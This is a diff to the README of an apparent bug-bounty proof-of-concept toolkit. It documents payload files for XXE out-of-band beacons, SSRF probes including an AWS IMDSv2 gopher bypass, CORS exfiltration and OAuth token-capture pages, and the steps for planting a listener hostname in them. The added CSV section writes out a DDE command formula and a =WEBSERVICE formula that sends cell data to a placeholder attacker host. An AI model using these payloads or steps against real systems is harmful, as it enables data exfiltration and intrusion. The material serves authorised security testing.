@@ -12,7 +12,7 @@ Most files here are **not "open and it pops" payloads** — they are attack *inp
 
 | You opened | What you see | Why |
 |---|---|---|
-| any PNG/JPG/GIF in `10_image_attacks/` | the image itself (a banner card) | image files never execute anything by being viewed — that is a browser/viewer guarantee, not a bug. Each carries a hidden payload (metadata chunk, COM segment, XXE entity, PHP) that fires only in the **vulnerable context described below** |
+| any PNG/JPG/GIF in `10_image_attacks/` | the image itself — 7 of the 9 carry a visible banner card; the 1×1 GIF and the dimension bomb cannot render one | image files never execute anything by being viewed — that is a browser/viewer guarantee, not a bug. Each carries a hidden payload (metadata chunk, COM segment, XXE entity, PHP) that fires only in the **vulnerable context described below** |
 | `pdf_uri_action_poc.pdf` in Chrome/Edge/Firefox | a text page | built-in browser viewers ignore PDF actions; **Adobe Acrobat** prompts/runs them |
 | `06_document_client/svg_xss_open_on_view.svg` | **an alert DOES fire** | this is the one image that pops — scripts run when an SVG is opened *directly* in a browser |
 | `06_document_client/pdf_html_polyglot_poc.html` | **an alert DOES fire** | its HTML side executes in a browser |
@@ -107,11 +107,11 @@ poc_files/
 │   ├── gif_comment_xss_poc.gif          GIF comment extension XSS
 │   └── image_filename_xss_poc.txt       filename-as-payload battery
 ├── 11_bounty_pages/                 ← attacker-hosted HTML pages (the deliverables)
-│   ├── cors_exfil_poc.html             credentialed read -> beacon (CORS rows)
-│   ├── csrf_autosubmit_poc.html        auto-submitting PoC form
-│   ├── cswsh_poc.html                  cross-site WebSocket hijacking page
-│   ├── xsleaks_timing_poc.html         timing-oracle harness (medians+separation)
-│   └── oauth_callback_poc.html         redirect_uri collector (code/token capture)
+│   ├── cors_exfil_poc.html              credentialed read -> beacon (CORS rows)
+│   ├── csrf_autosubmit_poc.html         auto-submitting PoC form
+│   ├── cswsh_poc.html                   cross-site WebSocket hijacking page
+│   ├── xsleaks_timing_poc.html          timing-oracle harness (medians+separation)
+│   └── oauth_callback_poc.html          redirect_uri collector (code/token capture)
 ├── 12_api_attacks/                  ← API-layer attack batteries
 │   ├── graphql_batch_bypass.http        alias/array batching + BOLA + mass-assign
 │   ├── jwt_tamper_battery.txt           jwt_tool command matrix
@@ -183,13 +183,13 @@ Because PNG/JPEG chunk length fields are byte-counted, **your replacement must b
 1. Build a same-length hostname: the placeholder is exactly **29 chars** (`YOUR-OOB-HOST.example.invalid`).
    Worked example: your listener is `a1b2c3d4.oast.fun` (17 chars) → label must be 29 - 17 - 1 (the dot) = **11 chars**.
    Per-input labels: `xmp1beef123` (11) → `xmp1beef123.a1b2c3d4.oast.fun` = exactly 29. Count yours with:
-   `python -c "print(len('YOUR-LABEL.a1b2c3d4.oast.fun'))"` → must print 29.
+   `python -c "print(len('xmp1beef123.a1b2c3d4.oast.fun'))"` → must print 29 (substitute YOUR 11-char label for `xmp1beef123`).
 2. Open the file in a hex editor (HxD is free).
 3. Ctrl+F → data type: *ASCII string* → search `YOUR-OOB-HOST`.
 4. Select exactly the 29 placeholder characters → paste your 29-char hostname (Overwrite mode!).
 5. Save. Do NOT add/remove bytes — chunk CRCs cover content but length mismatch corrupts the file.
-6. Verify: `python -c "import zlib,struct;..."` or just re-run `_upgrade_tools/audit_poc.py` — CRC walk must pass.
-   Alternative (easier): regenerate the file with your listener baked in — the generator scripts in `_upgrade_tools/make_poc_files4.py` take the placeholder constant.
+6. Verify: `python -c "import zlib,struct;..."` or just re-run `../_upgrade_tools/audit_poc.py` — CRC walk must pass.
+   Alternative (easier): regenerate the file with your listener baked in — the generator scripts in `../_upgrade_tools/make_poc_files4.py` take the placeholder constant.
 
 All other images/GIFs/PDFs ship **zero-edit** (benign payloads already baked in).
 
@@ -209,7 +209,7 @@ All other images/GIFs/PDFs ship **zero-edit** (benign payloads already baked in)
 ### Step 5 — XXE pairs (edit BOTH files consistently)
 1. `02_ssrf/xxe_oob_beacon.xml` + `xxe_oob_beacon.dtd` — the XML fetches the DTD; the DTD beacons back.
 2. Replace the placeholder in **both** files (2 occurrences in the .xml, 3 in the .dtd) with your listener.
-3. Serve the `.dtd` from the SAME listener host the XML points at, under the exact path the XML fetches: `http://<listener>/xxe_oob_beacon.dtd` (interactsh serves DNS/HTTP but not arbitrary files — host the DTD on your VPS or use Burp Collaborator's HTTP + a manual server).
+3. Serve the `.dtd` from the SAME listener host the XML points at, under the exact host AND path the XML fetches: `http://xxe1.<listener>/xxe_oob_beacon.dtd` — note the `xxe1.` label, which wildcard DNS resolves automatically on interactsh/Collaborator but a plain VPS A record does **not** (add the sub-label or drop it from both files) (interactsh serves DNS/HTTP but not arbitrary files — host the DTD on your VPS or use Burp Collaborator's HTTP + a manual server).
 4. Deliver the XML through the target's XML importer → two-stage callback: DTD fetch, then the content beacon.
 
 ### Step 6 — config uploads (`01_upload/`)
@@ -271,7 +271,7 @@ Each artifact defeats a different defense layer; run them as a sequence:
 | `ssrf_oob_probe_urls.txt` | URL battery: OOB, cloud metadata (AWS/GCP/Azure/Alibaba/Oracle), localhost/admin, obfuscation, schemes (gopher/dict/ftp/ldap) | any URL-accepting parameter | `YOUR-OOB-HOST.example.invalid` → your listener | OOB callback from target IP |
 | `ssrf_imds2_gopher_poc.txt` | AWS IMDSv2 bypass — raw PUT via gopher | SSRF on AWS with IMDSv2 enforced | nothing (paste into SSRF param) | token → role → `sts get-caller-identity` read-only |
 | `svg_ssrf_beacon.svg` | SSRF via server-side SVG rasterizers | SVG upload + thumbnail/convert | placeholder (2×) | OOB callback from worker IP |
-| `ffmpeg_lfi_ssrf_poc.m3u8` | FFmpeg/HLS file-read + internal fetch | transcode features | placeholder (1×) | output contains file content + OOB |
+| `ffmpeg_lfi_ssrf_poc.m3u8` | FFmpeg/HLS file-read + internal fetch | transcode features | placeholder (2×) | output contains file content + OOB |
 | `xxe_oob_beacon.xml` + `.dtd` | blind XXE two-hop exfil | XML endpoints, OOXML imports | placeholder in BOTH files | two-stage callback |
 
 ### `03_rce_linux/` — Linux execution
@@ -314,6 +314,20 @@ Each artifact defeats a different defense layer; run them as a sequence:
 | `template_ssti_poc.j2` | SSTI differential probes per engine | server-side template engines | nothing |
 | `linux_desktop_entry_poc.desktop` | `.desktop` launcher executes on open (Linux sibling of .hta) | Nautilus/Dolphin double-click; archive with exec-bit | nothing (benign echo; trust-prompt caveat documented) |
 | `docx_metadata_payload_poc.docx` | inert XSS + SSTI in `dc:title` | DMS/listing UIs, chat previews | nothing |
+
+**The two CSV variants kept inert on purpose** (`csv_formula_injection_poc.csv` rows 4–5 point here):
+
+- **DDE command execution** — the live form is `=cmd|'/c calc'!A1` (older Excel) or the
+  `+`/`-`/`@` equivalents. The shipped row carries a **leading apostrophe** so it stays text.
+  Excel has blocked DDE by default since 2017 (`DisableDDEServerLaunch`), so a modern target
+  needs the policy re-enabled — report it as a **data-validation** finding, not instant RCE.
+- **`=WEBSERVICE()` exfil** — `=WEBSERVICE("https://YOUR-OOB-HOST.example.invalid/?d="&A1)`
+  fetches a URL with neighbouring cell data concatenated in; pair with `=CONCATENATE()` to widen
+  the leak. Excel-only, prompts on external data, and **cannot see other users' sheets** — the
+  impact is *the export did not neutralize formulas*, confirmed by an OOB hit carrying cell data.
+
+Both evaluate only if the export writes the cell raw. The fix is the same for all of them: prefix
+any cell beginning `= + - @ \t \r` with an apostrophe, or quote the field.
 
 ### `07_sandbox_bypass/` — application sandbox escapes
 
